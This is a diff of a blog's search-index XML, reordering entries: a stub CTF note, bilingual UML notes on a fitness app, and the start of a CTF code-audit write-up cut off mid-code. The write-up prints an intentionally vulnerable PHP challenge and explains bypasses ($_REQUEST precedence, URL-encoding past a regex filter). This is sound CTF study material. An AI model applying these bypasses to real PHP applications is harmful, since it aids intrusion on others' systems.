@@ -233,6 +233,20 @@
       </tags>
   </entry>
   <entry>
+    <title>BuuctfDay11</title>
+    <url>/yakko117/2023/03/16/BUUCTFDay11/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="QWB2021-Quals-托纳多"><a href="#QWB2021-Quals-托纳多" class="headerlink" title="[QWB2021 Quals]托纳多"></a>[QWB2021 Quals]托纳多</h1><p><a href="https://www.anquanke.com/post/id/244153#h2-4">出题佬的恶意</a><br>算了 被WAF了</p>
+<p>写一下学习笔记好了</p>
+]]></content>
+      <categories>
+        <category>做题笔记</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BuuctfDay3</title>
     <url>/yakko117/2019/11/18/BUUCTFDay3/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-Day3"><a href="#BUUCTF-Day3" class="headerlink" title="BUUCTF Day3"></a>BUUCTF Day3</h1><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>sql注入，没什么好说的，告诉你表名和列名是flag<br>先测试 <code>1&#39;</code>，回显是bool型</p>
@@ -295,20 +309,6 @@
       </categories>
       <tags>
         <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BuuctfDay11</title>
-    <url>/yakko117/2023/03/16/BUUCTFDay11/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="QWB2021-Quals-托纳多"><a href="#QWB2021-Quals-托纳多" class="headerlink" title="[QWB2021 Quals]托纳多"></a>[QWB2021 Quals]托纳多</h1><p><a href="https://www.anquanke.com/post/id/244153#h2-4">出题佬的恶意</a><br>算了 被WAF了</p>
-<p>写一下学习笔记好了</p>
-]]></content>
-      <categories>
-        <category>做题笔记</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1204,6 +1204,54 @@
       </tags>
   </entry>
   <entry>
+    <title>Use several UML analysis techniques to produce a report</title>
+    <url>/yakko117/2023/04/19/Modelling_report_analysis/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="叙述"><a href="#叙述" class="headerlink" title="叙述"></a>叙述</h1><p>基于对任务的理解，给出可能的解决方案，要包含对解决问题的范围，以及客户为解决方案需要提供的任何信息。 </p>
+<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ol>
+<li>use case digram 用例图 </li>
+<li>use case description 用例描述 </li>
+<li>Domain Class Diagram 领域类图 </li>
+<li>Activity Diagram 活动图 </li>
+<li>System Sequence Diagram 系统时序图</li>
+</ol>
+<h2 id="注册和个人简介"><a href="#注册和个人简介" class="headerlink" title="注册和个人简介"></a>注册和个人简介</h2><p>每个用户都需要注册，并创建个人简介。用户可以选择填写一些健康和人口统计信息，如年龄、性别、地点、体重和身高，并指定一些健身目标。 </p>
+<p>Each user needs to register and create a personal profile. Users can choose to fill in some health and demographic information, such as age, gender, location, weight, and height, and specify some fitness goals. </p>
+<h2 id="健康日记"><a href="#健康日记" class="headerlink" title="健康日记"></a>健康日记</h2><p>用户可以在健康日记中记录各种健身活动和测量结果，例如体重、腰围、血压、静息心率等。用户还可以添加基于文本的日记条目，并附加照片或视频。日记条目应该像其他社会媒体网站，如 Facebook 上的帖子。用户也应该能够对彼此的条目进行评论。 </p>
+<p>Users can record various fitness activities and measurement results in their health diary, such as weight, waist circumference, blood pressure, resting heart rate, etc. Users can also add text based journal entries and attach photos or videos. Diary entries should resemble posts on other social media websites, such as Facebook. Users should also be able to comment on each other’s entries. </p>
+<h2 id="手动输入和设备同步"><a href="#手动输入和设备同步" class="headerlink" title="手动输入和设备同步"></a>手动输入和设备同步</h2><p>用户可以手动添加一个条目到他们的日记。他们还应该能够编辑或删除他们所做的任何条目。此外，移动应用程序需要接受来自健身设备的数据，并在同步时自动为设备捕获的活动或测量创建日记条目。 </p>
+<p>Users can manually add an entry to their diary. They should also be able to edit or delete any entries they make. In addition, mobile applications need to accept data from fitness devices and automatically create diary entries for activities or measurements captured by the device during synchronization. </p>
+<h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2><p>用户可以搜索其他用户并与之建立联系。连接请求需要得到接收请求的用户的批准。连接的用户将在他们的“订阅源”中看到彼此的“日记条目”，允许他们对这些条目发表评论。 </p>
+<p>Users can search for other users and establish contact with them. The connection request requires approval from the user receiving the request. Connected users will see each other’s “diary entries” in their “feed”, allowing them to comment on these entries. </p>
+<h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><p>用户可以创建报告来跟踪性能和测量结果。移动应用程序支持一系列报告，例如燃烧的卡路里总数，或每周的距离。随着时间的推移，报告可能是用户日记中记录的简单测量，如体重或血压。 </p>
+<p>Users can create reports to track performance and measurement results. The mobile application supports a series of reports, such as the total number of calories burned or the distance per week. Over time, reports may be simple measurements recorded in user diaries, such as weight or blood pressure. </p>
+<h2 id="实施阶段"><a href="#实施阶段" class="headerlink" title="实施阶段"></a>实施阶段</h2><p>该公司只考虑开发移动应用程序。尽管这需要与索赔处理系统集成才能反映折扣，但第一阶段的实施却忽视了这些折扣。第二阶段将涵盖整合方面。 </p>
+<p>The company only considers developing mobile applications. Although this requires integration with the claims processing system to reflect discounts, the implementation of the first phase overlooked these discounts. The second phase will cover the integration aspect. </p>
+<hr>
+<h1 id="用例描述"><a href="#用例描述" class="headerlink" title="用例描述"></a>用例描述</h1><h2 id="Record-Fitness-Activity（记录健身活动）"><a href="#Record-Fitness-Activity（记录健身活动）" class="headerlink" title="Record Fitness Activity（记录健身活动）"></a>Record Fitness Activity（记录健身活动）</h2><p>场景：用户在健身后打开应用程序，并选择“记录健身活动”用例。他们选择所进行的活动类型（如跑步、骑自行车、游泳），并输入相关信息（如距离、时间、地点等）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p>
+<p>前置条件：用户已经下载并注册了健康生活应用程序，并且具有健身活动可以记录。 </p>
+<h2 id="Record-Health-Measurements（记录健康指标）"><a href="#Record-Health-Measurements（记录健康指标）" class="headerlink" title="Record Health Measurements（记录健康指标）"></a>Record Health Measurements（记录健康指标）</h2><p>场景：用户打开应用程序，并选择“记录健康指标”用例。他们选择所记录的指标类型（如体重、血压、静息心率），并输入相关数据（如数值和日期）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p>
+<p>前置条件：用户已经下载并注册了健康生活应用程序，并且需要记录某些健康指标。 </p>
+<h2 id="Connect-with-Friends（连接朋友）"><a href="#Connect-with-Friends（连接朋友）" class="headerlink" title="Connect with Friends（连接朋友）"></a>Connect with Friends（连接朋友）</h2><p>场景：用户想要与其他健康生活应用程序用户建立联系。他们打开应用程序并选择“连接朋友”用例。用户可以搜索其他用户，并向他们发送连接请求。如果请求被接受，用户可以查看彼此的日记条目，并互相喜欢、评论和分享条目。 </p>
+<p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要连接其他用户。 </p>
+<h2 id="View-Progress-and-Reports（查看进展和报告）"><a href="#View-Progress-and-Reports（查看进展和报告）" class="headerlink" title="View Progress and Reports（查看进展和报告）"></a>View Progress and Reports（查看进展和报告）</h2><p>场景：用户想要查看他们的进展和生成报告。他们打开应用程序，并选择“查看进展和报告”用例。应用程序将为他们生成有关他们的日记条目、健身活动和健康指标的报告，并允许用户跟踪他们的进展。 </p>
+<p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要查看他们的进展和报告。 </p>
+<h2 id="Healthy-Living-App（健康生活应用程序）"><a href="#Healthy-Living-App（健康生活应用程序）" class="headerlink" title="Healthy Living App（健康生活应用程序）"></a>Healthy Living App（健康生活应用程序）</h2><p>场景：用户打开健康生活应用程序，并使用其各种功能。这包括记录健身活动、记录健康指标、连接其他用户、查看进展和报告等。 </p>
+<p>前置条件：用户已经下载并注册了健康生活应用程序，并且想要使用它的各种功能。 </p>
+<h2 id="class-diagram-amp-domain-class-diagram"><a href="#class-diagram-amp-domain-class-diagram" class="headerlink" title="class diagram &amp; domain class diagram"></a>class diagram &amp; domain class diagram</h2><p>A class diagram is a diagram that illustrates the classes, interfaces, and their relationships in a system. It provides an overview of the system’s objects, attributes, methods, and associations.<br>类图(Class Diagram)是一种图表，它展示了系统中类、接口及它们之间的关系。它提供了系统对象、属性、方法和关联的概览。</p>
+<p>A domain class diagram, on the other hand, is a type of class diagram that focuses specifically on the objects and classes in a particular domain. The domain is a specific area of knowledge or expertise, such as accounting, medicine, or engineering. In a domain class diagram, only the classes that are relevant to that domain are included, and relationships between those classes are defined in terms of the domain’s concepts and terminology.<br>领域类图(Domain Class Diagram)则是一种特定类型的类图，它专注于某个特定领域中的对象和类。领域是特定的知识或专业领域，例如会计、医学或工程学。在领域类图中，只包括与该领域相关的类，并且这些类之间的关系以该领域的概念和术语来定义。</p>
+<h3 id="The-main-differences"><a href="#The-main-differences" class="headerlink" title="The main differences"></a>The main differences</h3><p><code>Scope</code>: A domain class diagram has a <code>narrower</code> scope than a class diagram. It focuses only on the classes that are relevant to a specific domain.</p>
+<p><code>Terminology</code>: A domain class diagram uses the terminology of the domain it represents, while a class diagram may use more general terminology.</p>
+<p><code>Abstraction</code>: A domain class diagram may be more abstract than a class diagram, as it may leave out details that are not relevant to the domain.</p>
+<p><code>Purpose</code>: A domain class diagram is designed to help people understand the relationships between classes within a specific domain, while a class diagram is designed to provide an overview of the classes, interfaces, and their relationships in a system.</p>
+]]></content>
+      <categories>
+        <category>Monash笔记</category>
+      </categories>
+      <tags>
+        <tag>Paper Note Taking</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>User requirements modeling and analysis of software-intensive systems</title>
     <url>/yakko117/2023/03/23/Modelling_paper_note_taking/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://doi.org/10.1016/j.jss.2010.10.020">https://doi.org/10.1016/j.jss.2010.10.020</a><br>Author: <em>Michel dos Santos Soares, Jos Vrancken, Alexander Verbraeck</em><br><em>Delft University of Technology</em></p>
@@ -1286,54 +1334,6 @@
 <p>Use Case Diagrams are used to communicate with stakeholders about the functional requirements of a system. They help to identify the system’s behavior and its interactions with other systems or users. The diagram can be used to describe the scope of the system, the actors involved, and the relationships between them, which helps to identify potential issues or requirements that may have been overlooked.<br>用例图用于与利益相关者就系统的功能需求进行沟通。 它们有助于识别系统的行为及其与其他系统或用户的交互。 该图可用于描述系统的范围、涉及的参与者以及它们之间的关系，这有助于识别可能被忽略的潜在问题或需求。</p>
 <h2 id="Requirements-Diagram"><a href="#Requirements-Diagram" class="headerlink" title="Requirements Diagram"></a>Requirements Diagram</h2><p>Requirements Diagram in SysML is a graphical representation of the requirements for a system. It provides a structured way to capture and organize requirements, which can help to ensure that all stakeholders have a clear understanding of the system’s needs and goals.<br>SysML 中的需求图是系统需求的图形表示。 它提供了一种结构化的方式来捕获和组织需求，这有助于确保所有涉众都清楚地了解系统的需求和目标。</p>
 <p>The Requirements Diagram typically consists of several parts, including requirements, requirements categories, and requirement relationships. Requirements are represented as rectangular shapes, and each requirement is labeled with a unique identifier and a brief description. Requirements categories are used to group related requirements together, and relationships between requirements are used to show dependencies and interactions between them.<br>需求图通常由几个部分组成，包括需求、需求类别和需求关系。 需求以矩形表示，每个需求都标有唯一标识符和简短描述。 需求类别用于将相关需求分组在一起，需求之间的关系用于显示它们之间的依赖关系和相互作用。</p>
-]]></content>
-      <categories>
-        <category>Monash笔记</category>
-      </categories>
-      <tags>
-        <tag>Paper Note Taking</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Use several UML analysis techniques to produce a report</title>
-    <url>/yakko117/2023/04/19/Modelling_report_analysis/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="叙述"><a href="#叙述" class="headerlink" title="叙述"></a>叙述</h1><p>基于对任务的理解，给出可能的解决方案，要包含对解决问题的范围，以及客户为解决方案需要提供的任何信息。 </p>
-<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ol>
-<li>use case digram 用例图 </li>
-<li>use case description 用例描述 </li>
-<li>Domain Class Diagram 领域类图 </li>
-<li>Activity Diagram 活动图 </li>
-<li>System Sequence Diagram 系统时序图</li>
-</ol>
-<h2 id="注册和个人简介"><a href="#注册和个人简介" class="headerlink" title="注册和个人简介"></a>注册和个人简介</h2><p>每个用户都需要注册，并创建个人简介。用户可以选择填写一些健康和人口统计信息，如年龄、性别、地点、体重和身高，并指定一些健身目标。 </p>
-<p>Each user needs to register and create a personal profile. Users can choose to fill in some health and demographic information, such as age, gender, location, weight, and height, and specify some fitness goals. </p>
-<h2 id="健康日记"><a href="#健康日记" class="headerlink" title="健康日记"></a>健康日记</h2><p>用户可以在健康日记中记录各种健身活动和测量结果，例如体重、腰围、血压、静息心率等。用户还可以添加基于文本的日记条目，并附加照片或视频。日记条目应该像其他社会媒体网站，如 Facebook 上的帖子。用户也应该能够对彼此的条目进行评论。 </p>
-<p>Users can record various fitness activities and measurement results in their health diary, such as weight, waist circumference, blood pressure, resting heart rate, etc. Users can also add text based journal entries and attach photos or videos. Diary entries should resemble posts on other social media websites, such as Facebook. Users should also be able to comment on each other’s entries. </p>
-<h2 id="手动输入和设备同步"><a href="#手动输入和设备同步" class="headerlink" title="手动输入和设备同步"></a>手动输入和设备同步</h2><p>用户可以手动添加一个条目到他们的日记。他们还应该能够编辑或删除他们所做的任何条目。此外，移动应用程序需要接受来自健身设备的数据，并在同步时自动为设备捕获的活动或测量创建日记条目。 </p>
-<p>Users can manually add an entry to their diary. They should also be able to edit or delete any entries they make. In addition, mobile applications need to accept data from fitness devices and automatically create diary entries for activities or measurements captured by the device during synchronization. </p>
-<h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2><p>用户可以搜索其他用户并与之建立联系。连接请求需要得到接收请求的用户的批准。连接的用户将在他们的“订阅源”中看到彼此的“日记条目”，允许他们对这些条目发表评论。 </p>
-<p>Users can search for other users and establish contact with them. The connection request requires approval from the user receiving the request. Connected users will see each other’s “diary entries” in their “feed”, allowing them to comment on these entries. </p>
-<h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><p>用户可以创建报告来跟踪性能和测量结果。移动应用程序支持一系列报告，例如燃烧的卡路里总数，或每周的距离。随着时间的推移，报告可能是用户日记中记录的简单测量，如体重或血压。 </p>
-<p>Users can create reports to track performance and measurement results. The mobile application supports a series of reports, such as the total number of calories burned or the distance per week. Over time, reports may be simple measurements recorded in user diaries, such as weight or blood pressure. </p>
-<h2 id="实施阶段"><a href="#实施阶段" class="headerlink" title="实施阶段"></a>实施阶段</h2><p>该公司只考虑开发移动应用程序。尽管这需要与索赔处理系统集成才能反映折扣，但第一阶段的实施却忽视了这些折扣。第二阶段将涵盖整合方面。 </p>
-<p>The company only considers developing mobile applications. Although this requires integration with the claims processing system to reflect discounts, the implementation of the first phase overlooked these discounts. The second phase will cover the integration aspect. </p>
-<hr>
-<h1 id="用例描述"><a href="#用例描述" class="headerlink" title="用例描述"></a>用例描述</h1><h2 id="Record-Fitness-Activity（记录健身活动）"><a href="#Record-Fitness-Activity（记录健身活动）" class="headerlink" title="Record Fitness Activity（记录健身活动）"></a>Record Fitness Activity（记录健身活动）</h2><p>场景：用户在健身后打开应用程序，并选择“记录健身活动”用例。他们选择所进行的活动类型（如跑步、骑自行车、游泳），并输入相关信息（如距离、时间、地点等）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p>
-<p>前置条件：用户已经下载并注册了健康生活应用程序，并且具有健身活动可以记录。 </p>
-<h2 id="Record-Health-Measurements（记录健康指标）"><a href="#Record-Health-Measurements（记录健康指标）" class="headerlink" title="Record Health Measurements（记录健康指标）"></a>Record Health Measurements（记录健康指标）</h2><p>场景：用户打开应用程序，并选择“记录健康指标”用例。他们选择所记录的指标类型（如体重、血压、静息心率），并输入相关数据（如数值和日期）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p>
-<p>前置条件：用户已经下载并注册了健康生活应用程序，并且需要记录某些健康指标。 </p>
-<h2 id="Connect-with-Friends（连接朋友）"><a href="#Connect-with-Friends（连接朋友）" class="headerlink" title="Connect with Friends（连接朋友）"></a>Connect with Friends（连接朋友）</h2><p>场景：用户想要与其他健康生活应用程序用户建立联系。他们打开应用程序并选择“连接朋友”用例。用户可以搜索其他用户，并向他们发送连接请求。如果请求被接受，用户可以查看彼此的日记条目，并互相喜欢、评论和分享条目。 </p>
-<p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要连接其他用户。 </p>
-<h2 id="View-Progress-and-Reports（查看进展和报告）"><a href="#View-Progress-and-Reports（查看进展和报告）" class="headerlink" title="View Progress and Reports（查看进展和报告）"></a>View Progress and Reports（查看进展和报告）</h2><p>场景：用户想要查看他们的进展和生成报告。他们打开应用程序，并选择“查看进展和报告”用例。应用程序将为他们生成有关他们的日记条目、健身活动和健康指标的报告，并允许用户跟踪他们的进展。 </p>
-<p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要查看他们的进展和报告。 </p>
-<h2 id="Healthy-Living-App（健康生活应用程序）"><a href="#Healthy-Living-App（健康生活应用程序）" class="headerlink" title="Healthy Living App（健康生活应用程序）"></a>Healthy Living App（健康生活应用程序）</h2><p>场景：用户打开健康生活应用程序，并使用其各种功能。这包括记录健身活动、记录健康指标、连接其他用户、查看进展和报告等。 </p>
-<p>前置条件：用户已经下载并注册了健康生活应用程序，并且想要使用它的各种功能。 </p>
-<h2 id="class-diagram-amp-domain-class-diagram"><a href="#class-diagram-amp-domain-class-diagram" class="headerlink" title="class diagram &amp; domain class diagram"></a>class diagram &amp; domain class diagram</h2><p>A class diagram is a diagram that illustrates the classes, interfaces, and their relationships in a system. It provides an overview of the system’s objects, attributes, methods, and associations.<br>类图(Class Diagram)是一种图表，它展示了系统中类、接口及它们之间的关系。它提供了系统对象、属性、方法和关联的概览。</p>
-<p>A domain class diagram, on the other hand, is a type of class diagram that focuses specifically on the objects and classes in a particular domain. The domain is a specific area of knowledge or expertise, such as accounting, medicine, or engineering. In a domain class diagram, only the classes that are relevant to that domain are included, and relationships between those classes are defined in terms of the domain’s concepts and terminology.<br>领域类图(Domain Class Diagram)则是一种特定类型的类图，它专注于某个特定领域中的对象和类。领域是特定的知识或专业领域，例如会计、医学或工程学。在领域类图中，只包括与该领域相关的类，并且这些类之间的关系以该领域的概念和术语来定义。</p>
-<h3 id="The-main-differences"><a href="#The-main-differences" class="headerlink" title="The main differences"></a>The main differences</h3><p><code>Scope</code>: A domain class diagram has a <code>narrower</code> scope than a class diagram. It focuses only on the classes that are relevant to a specific domain.</p>
-<p><code>Terminology</code>: A domain class diagram uses the terminology of the domain it represents, while a class diagram may use more general terminology.</p>
-<p><code>Abstraction</code>: A domain class diagram may be more abstract than a class diagram, as it may leave out details that are not relevant to the domain.</p>
-<p><code>Purpose</code>: A domain class diagram is designed to help people understand the relationships between classes within a specific domain, while a class diagram is designed to provide an overview of the classes, interfaces, and their relationships in a system.</p>
 ]]></content>
       <categories>
         <category>Monash笔记</category>
@@ -2239,6 +2239,48 @@
       </tags>
   </entry>
   <entry>
+    <title>贴贴校赛代码审计题的总结学习</title>
+    <url>/yakko117/2019/09/26/ccsu_codeaudit/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Code-Easy-Audit"><a href="#Code-Easy-Audit" class="headerlink" title="Code_Easy_Audit"></a>Code_Easy_Audit</h1><p>首先看源码吧</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Null          ...            Null            ...            Null          ...  &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>(<span class="variable">$_REQUEST as</span> <span class="variable">$key </span>=&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cyber|flag|ciscn/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack...&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^ciscnsec$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>] !== <span class="string">&#x27;ciscnsec&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag </span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack....&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag </span>=== <span class="string">&#x27;security&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span><span class="title function_ invoke__"> die</span>(<span class="string">&#x27;Hello Hack.....&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这题考几个点：</p>
+<ol>
+<li><code>$_REQUEST</code> 的变量覆盖</li>
+<li>编码绕过</li>
+<li>PHP数组特性</li>
+<li>正则绕过</li>
+<li><code>file_get_contents</code> 函数</li>
+</ol>
+<hr>
+<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span><span class="title function_ invoke__"> </span>(<span class="variable">$_REQUEST as</span> <span class="variable">$key </span>=&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p> 上述代码把 <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>传进来的值进行了正则匹配，如果包含了<code>A-Z</code> 和 <code>a-z</code>的字母就被waf</p>
+<p>这里的 <code>$_REQUEST</code>有一个特性，就是当 <code>GET</code> 和 <code>POST</code> 都存在同一个变量名的时候，只获取 <code>POST</code> 中的值，所以可以通过这个特性来绕过正则的匹配</p>
+<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdve9vj31570g240l.jpg" class="lazyload"></a></p>
+<p>当POST中也有个变量的时候，abc就会输出，否则就输出waf</p>
+<hr>
+<p>接着往下分析</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cyber|flag|ciscn/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack..&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>关于 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 获取的值，就是get中变量名和内容</p>
+<p>详细资料可以参考<a href="https://blog.csdn.net/fjb2080/article/details/80548431">一篇CSDN详解</a><br>这个绕过思路就是 <code>URL编码</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g7d7qdvcfwj30z70mf411.jpg" class="lazyload"></a></p>
+<hr>
+<p>然后就是下面的代码</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cyber&#x27;</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack...&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^ciscnsec$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>] !== <span class="string">&#x27;ciscnsec&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag </span>= <span class="title function_ 